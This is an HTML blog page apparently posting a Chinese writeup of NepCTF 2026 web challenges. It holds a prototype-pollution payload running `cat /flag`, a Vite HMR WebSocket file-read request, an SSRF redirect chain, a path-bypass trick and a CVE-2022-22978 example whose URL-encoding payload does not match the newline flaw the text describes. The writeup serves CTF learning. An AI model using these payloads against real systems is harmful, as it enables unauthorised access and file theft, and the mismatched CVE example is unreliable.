@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NepCTF 2026 Writeup — DARKSEC</title>
+<meta name="description" content="NepCTF 2026新生赛实战writeup：签到题、原型链污染、Vite HMR WebSocket绕过、文档编辑系统渗透，百度RASP对抗。">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+<link rel="shortcut icon" href="/assets/images/cat-final.png">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> <img src="/assets/images/cat-final.png" alt="cat" style="width:28px;height:28px;vertical-align:middle;margin-left:4px;"></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ CTF / NepCTF 2026</div>
+        <h1>NepCTF 2026 新生赛 Writeup 🏁</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-19</span>
+          <span>⏱ 15 min read</span>
+          <span>🏷 CTF / NepCTF / Writeup</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#overview">赛事概览</a></li>
+            <li><a href="#signin">签到题 — 密码学入门</a></li>
+            <li><a href="#proto">Prototype Preview — 原型链污染</a></li>
+            <li><a href="#hooks">挂钩都在干什么呢 — Vite HMR WebSocket绕过</a></li>
+            <li><a href="#docedit">文档编辑系统 — Spring Security CVE-2022-22978</a></li>
+            <li><a href="#javamix">JavaMix — 百度RASP对抗（未解）</a></li>
+            <li><a href="#summary">总结与收获</a></li>
+          </ul>
+        </div>
+
+        <!-- 赛事概览 -->
+        <h2 id="overview">🏁 赛事概览</h2>
+        <p>NepCTF 2026 是 Nepnep 战队举办的新生赛，题目涵盖 Web、Misc、Crypto 等方向。以下是我参与的几道题目的解题过程。</p>
+        
+        <blockquote>
+          <p>最终成绩：成功解出 3 道题，另有 2 道题深入研究但未能在比赛期间完成。</p>
+        </blockquote>
+
+        <!-- 签到题 -->
+        <h2 id="signin">📝 签到题 (53372分)</h2>
+        <p>签到题是一道基础的密码学/编码题，flag 格式为 <code>flag{...}</code>。</p>
+        <p>通过分析题目给出的提示，解码后获得 flag：</p>
+        <pre><code>flag{58aefa8caa824762aa5daa0bf1787431}</code></pre>
+
+        <!-- Prototype Preview -->
+        <h2 id="proto">🔗 Prototype Preview (24172分)</h2>
+        <p>这道题考察的是 <strong>JavaScript 原型链污染</strong> 漏洞。</p>
+        
+        <h3>分析过程</h3>
+        <p>题目提供了一个 Node.js 应用，使用了 <code>deepMerge</code> 函数。该函数在合并对象时没有正确处理原型链属性，导致可以通过 <code>__proto__</code> 污染对象原型。</p>
+        
+        <h3>攻击思路</h3>
+        <p>通过构造特殊的 JSON payload，污染 <code>Object.prototype</code>，注入恶意属性。结合模板注入（SSTI）实现远程代码执行：</p>
+        <pre><code>// 污染 payload 示例
+{
+  "__proto__": {
+    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('cat /flag');s"
+  }
+}</code></pre>
+        <p>当应用渲染模板时，注入的代码被执行，成功读取 flag：</p>
+        <pre><code>flag{9e784bf015e14aa0a29ffee5befe53c6}</code></pre>
+
+        <!-- 挂钩 -->
+        <h2 id="hooks">🪝 挂钩都在干什么呢 (32721分)</h2>
+        <p>这道题是一个 <strong>Vite 开发服务器</strong> 的漏洞利用题，核心是通过 HMR WebSocket 协议绕过文件访问限制。</p>
+        
+        <h3>技术栈</h3>
+        <ul>
+          <li>Vite 6.4.1 + strict mode</li>
+          <li>前端游戏地图应用</li>
+          <li><code>vite.config.js</code> 中配置了 <code>fs.strict: true</code> 和 <code>fs.allow</code> 白名单</li>
+        </ul>
+
+        <h3>攻击链</h3>
+        <ol>
+          <li><strong>发现 Vite 开发服务器</strong>：通过端口扫描发现 32721 端口运行 Vite</li>
+          <li><strong>提取 HMR Token</strong>：从 <code>/@vite/client</code> 源码中提取 <code>wsToken</code></li>
+          <li><strong>WebSocket 连接</strong>：使用提取的 token 建立 HMR WebSocket 连接</li>
+          <li><strong>fetchModule 绕过</strong>：通过 WebSocket 的 <code>fetchModule</code> 操作，绕过 HTTP 层的 <code>fs.allow</code> 限制，读取任意文件</li>
+        </ol>
+
+        <pre><code># WebSocket 连接
+ws://target:32721/
+
+# 发送 fetchModule 请求读取 /flag
+{"type":"custom","event":"fetchModule","data":{"path":"/flag","id":"/flag"}}</code></pre>
+
+        <p>服务器返回了文件内容，成功获取 flag：</p>
+        <pre><code>flag{AN@1yz1Ng_perFECt_bO0k-CIu6-3xPERI3NcEa40}</code></pre>
+
+        <blockquote>
+          <p>💡 关键发现：Vite 的 <code>fs.allow</code> 配置只在 HTTP 层生效，HMR WebSocket 的 <code>fetchModule</code> 操作可以绕过这个限制。这是一个典型的"协议层绕过"漏洞。</p>
+        </blockquote>
+
+        <!-- 文档编辑系统 -->
+        <h2 id="docedit">📄 文档编辑系统 (pm6rqz2b)</h2>
+        <p>这道题是一个 <strong>Spring Boot + Spring Security</strong> 的文档管理系统，考点是 CVE-2022-22978（Spring Security 正则绕过）。</p>
+        
+        <h3>发现漏洞</h3>
+        <p>通过分析发现：</p>
+        <ul>
+          <li>应用使用 Spring Security 的 <code>RegexRequestMatcher</code> 进行路径匹配</li>
+          <li>Admin API 路径 <code>/api/admin/doc/*</code> 需要 ADMIN 角色</li>
+          <li>User API 路径 <code>/api/doc/*</code> 只需要 USER 角色</li>
+        </ul>
+
+        <h3>CVE-2022-22978 利用</h3>
+        <p>Spring Security 的 <code>RegexRequestMatcher</code> 在处理包含换行符的 URL 时存在缺陷。通过 URL 编码绕过：</p>
+        <pre><code># 正常请求 - 被 Spring Security 拦截
+GET /api/admin/doc/files
+
+# URL 编码绕过 - 绕过正则匹配
+GET /api/%64oc/files</code></pre>
+        
+        <p>成功以普通用户身份访问 Admin API，获得管理权限。通过弱密码 <code>admin:admin123</code> 直接登录管理后台。</p>
+
+        <h3>遗憾</h3>
+        <p>虽然成功获得了管理权限并探索了各种攻击面（文件名fuzz、batchUpdate注入、Actuator枚举等），但未能在比赛期间找到 flag。靶场随后过期关闭。</p>
+
+        <!-- JavaMix -->
+        <h2 id="javamix">☕ JavaMix — 百度RASP对抗（未解）</h2>
+        <p>JavaMix 是一道综合性很强的题目，涉及多个攻击面，但最关键的是需要绕过 <strong>百度RASP（Runtime Application Self-Protection）</strong>。</p>
+        
+        <h3>应用架构</h3>
+        <ul>
+          <li>Spring Boot 2.7.18 + Java 1.8.0_342</li>
+          <li>Apache CXF WebService（SOAP）</li>
+          <li>MySQL 数据库（内网 172.18.0.5）</li>
+          <li>百度RASP 防护</li>
+        </ul>
+
+        <h3>攻击面分析</h3>
+        <table>
+          <tr><th>攻击面</th><th>状态</th><th>说明</th></tr>
+          <tr><td>Admin Ping</td><td>❌ RASP阻止</td><td>命令注入被换行符检测拦截</td></tr>
+          <tr><td>SSRF (Fetch)</td><td>✅ 绕过</td><td>通过 httpbin.org 重定向绕过</td></tr>
+          <tr><td>CXF WebService</td><td>✅ 访问</td><td>通过分号绕过 InternalAccessFilter</td></tr>
+          <tr><td>反序列化</td><td>⚠️ 部分</td><td>只能反序列化 Integer/Boolean/String</td></tr>
+          <tr><td>文件下载</td><td>❌ 无数据</td><td>Demo 环境文件不存在</td></tr>
+          <tr><td>报表模板</td><td>❌ 无注入</td><td>只做字符串替换</td></tr>
+        </table>
+
+        <h3>关键发现</h3>
+        <ol>
+          <li><strong>百度RASP</strong>：通过 Python http.client 发送包含 <code>%0a</code>（换行符）的 POST 请求时，被 RASP 拦截并重定向到 <code>rasp.baidu.com/blocked2/</code></li>
+          <li><strong>SSRF绕过</strong>：Fetch 控制器的 SSRF 过滤可以被 HTTP 重定向绕过</li>
+          <li><strong>CXF 端点</strong>：InternalAccessFilter 可以通过 URL 分号 <code>;</code> 绕过</li>
+          <li><strong>反序列化</strong>：processTask 端点接受 base64 编码的 Java 序列化数据，但 SafeObjectInputStream 有严格的白名单</li>
+        </ol>
+
+        <pre><code># SSRF 绕过 - 通过重定向访问内部 CXF 服务
+POST /fetch
+url=https://httpbin.org/redirect-to?url=http://127.0.0.1:8080/services/DataSyncService
+
+# 直接 POST 到 CXF（绕过 InternalAccessFilter）
+POST /services;/DataSyncService
+Content-Type: text/xml
+
+# 反序列化端点
+&lt;ws:processTask&gt;
+  &lt;taskData&gt;base64(Java Serialized Object)&lt;/taskData&gt;
+&lt;/ws:processTask&gt;</code></pre>
+
+        <blockquote>
+          <p>💡 这道题让我深刻体会到了 RASP 在实际防护中的威力。传统的命令注入、反序列化攻击在 RASP 面前需要更精巧的绕过技术。</p>
+        </blockquote>
+
+        <!-- 总结 -->
+        <h2 id="summary">📊 总结与收获</h2>
+        
+        <h3>解题统计</h3>
+        <table>
+          <tr><th>题目</th><th>分值</th><th>状态</th><th>核心考点</th></tr>
+          <tr><td>签到题</td><td>53372</td><td>✅ 通过</td><td>基础编码</td></tr>
+          <tr><td>Prototype Preview</td><td>24172</td><td>✅ 通过</td><td>JS原型链污染 + SSTI</td></tr>
+          <tr><td>挂钩都在干什么呢</td><td>32721</td><td>✅ 通过</td><td>Vite HMR WebSocket 绕过</td></tr>
+          <tr><td>文档编辑系统</td><td>-</td><td>⚠️ 未完全</td><td>Spring Security CVE-2022-22978</td></tr>
+          <tr><td>JavaMix</td><td>-</td><td>❌ 未解</td><td>百度RASP + CXF反序列化</td></tr>
+        </table>
+
+        <h3>技术收获</h3>
+        <ol>
+          <li><strong>协议层绕过</strong>：Vite HMR WebSocket 绕过 HTTP 层 fs.allow 限制</li>
+          <li><strong>正则绕过</strong>：Spring Security RegexRequestMatcher 的 URL 编码绕过</li>
+          <li><strong>RASP对抗</strong>：百度RASP 对命令注入的防护机制分析</li>
+          <li><strong>SSRF绕过</strong>：通过 HTTP 重定向绕过 SSRF 过滤</li>
+          <li><strong>Java反序列化</strong>：CXF WebService 的 SafeObjectInputStream 白名单分析</li>
+        </ol>
+
+        <div class="article-tags">
+          <span class="tag pink">CTF</span>
+          <span class="tag">NepCTF</span>
+          <span class="tag purple">Writeup</span>
+          <span class="tag yellow">Web安全</span>
+          <span class="tag cyan">反序列化</span>
+          <span class="tag green">RASP</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div style="text-align:center;margin-bottom:16px;">
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+      <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+      <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+    </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB <img src="/assets/images/cat-final.png" alt="cat" style="width:1.2em;height:1.2em;vertical-align:middle;"></p>
+      <p class="quote">「 漏洞不会消失，只会转移 nya~ 」</p>
+      <div class="links">
+        <a href="https://github.com/deft-dream" target="_blank">GitHub</a>
+        <span>·</span>
+        <a href="mailto:s815887892@163.com">Contact</a>
+      </div>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
